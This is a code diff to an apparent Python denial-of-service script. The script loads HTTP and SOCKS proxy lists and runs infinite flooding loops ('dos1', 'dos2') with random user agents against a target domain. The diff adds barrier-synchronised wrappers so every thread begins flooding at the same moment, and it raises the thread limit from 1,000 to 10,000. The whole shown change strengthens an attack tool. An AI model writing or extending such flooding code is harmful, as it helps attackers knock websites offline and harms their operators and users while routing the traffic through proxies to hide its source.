@@ -18,6 +18,14 @@ with open('proxyhttp') as file:
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 
+def dospause1(barrier, url):
+    barrier.wait()
+    dos1(url)
+
+def dospause2(barrier, url):
+    barrier.wait()
+    dos2(url)
+
 def dos1(target):
     while True:
         useragent = random.choice(headersp)
@@ -76,13 +84,14 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 1000]: "))
+    threads = int(input("Threads[max 10000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 1000:
+if threads == 0 or threads > 10000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
+bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
